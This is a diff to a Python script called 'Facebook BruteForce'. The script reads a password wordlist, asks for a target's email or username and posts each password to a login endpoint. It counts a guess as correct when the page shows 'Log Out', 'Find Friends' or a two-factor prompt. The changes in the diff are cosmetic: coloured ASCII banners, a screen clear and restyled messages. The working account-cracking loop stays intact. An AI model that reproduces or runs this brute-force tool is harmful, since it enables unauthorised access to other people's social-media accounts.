@@ -40,24 +40,25 @@ def is_this_a_password(email, index, password):
     r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
     if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
         open('temp', 'w').write(str(r.content))
-        print('\npassword found is: ', password)
+        print('\nPassword Found Is: ', password)
         return True
     return False
 
 
 if __name__ == "__main__":
+	os.system('clear')
     print("\n     \x1b\033[38;5;198m  █████▒▄▄▄▄       \x1b[38;5;208m▄▄▄▄    ██▀███   \033[1;92m█    ██ \033[33;1m▄▄▄█████▓▓█████ \n     \x1b\033[38;5;198m▓██   ▒▓█████▄    \x1b[38;5;208m▓█████▄ ▓██ ▒ ██▒ \033[1;92m██  ▓██▒▓  \033[33;1m██▒ ▓▒▓█   ▀ \n     \x1b\033[38;5;198m▒████ ░▒██▒ ▄██   \x1b[38;5;208m▒██▒ ▄██▓██ ░▄█ \033[1;92m▒▓██  ▒██░▒ \033[33;1m▓██░ ▒░▒███   \n     \x1b\033[38;5;198m░▓█▒  ░▒██░█▀     \x1b[38;5;208m▒██░█▀  ▒██▀▀█▄  \033[1;92m▓▓█  ░██░░ \033[33;1m▓██▓ ░ ▒▓█  ▄ \n     \x1b\033[38;5;198m░▒█░   ░▓█  ▀█▓   \x1b[38;5;208m░▓█  ▀█▓░██▓ ▒██▒\033[1;92m▒▒█████▓   \033[33;1m▒██▒ ░ ░▒████▒\n     \x1b\033[38;5;198m ▒ ░   ░▒▓███▀▒   \x1b[38;5;208m░▒▓███▀▒░ ▒▓ ░▒▓░\033[1;92m░▒▓▒ ▒ ▒   \033[33;1m▒ ░░   ░░ ▒░ ░\n     \x1b\033[38;5;198m ░     ▒░▒   ░    \x1b[38;5;208m▒░▒   ░   ░▒ ░ ▒░░░\033[1;92m▒░ ░ ░     \033[33;1m░     ░ ░  ░\n     \x1b\033[38;5;198m ░ ░    ░    ░     \x1b[38;5;208m░    ░   ░░   ░  ░░\033[1;92m░ ░ ░   ░  \033[33;1m       ░   \n     \x1b\033[38;5;198m        ░          \x1b[38;5;208m░         ░        ░\033[1;92m            \033[33;1m     ░  ░\n     \x1b\033[38;5;198m             ░          \x1b[38;5;208m░   ")
     print('\n\t\033[38;5;196m---------- \033[1;32mWelcome To Facebook BruteForce \033[38;5;196m----------\n')
     if not os.path.isfile(PASSWORD_FILE):
-        print("Password file is not exist: ", PASSWORD_FILE)
+        print("Password File Is Not Exist: ", PASSWORD_FILE)
         sys.exit(0)
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
-    print("Password file selected: ", PASSWORD_FILE)
-    email = input('Enter Email/Username to target: ').strip()
+    print("\n\t\033[1;92m<\x1b\033[38;5;198m/\033[1;92m> \033[33;1mPassword File Selected :\033[1;32m", PASSWORD_FILE)
+    email = input('\n\t\033[33;1m Email/Username To Target ➤ ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
             continue
-        print("Trying password [", index, "]: ", password)
+        print("\t\033[1;92m<\x1b\033[38;5;198m/\033[1;92m> \033[33;1m Password \033[38;5;196m<━━\x1b[1;97m[", index, "]\033[38;5;196m━━━>: ", password)
         if is_this_a_password(email, index, password):
             break
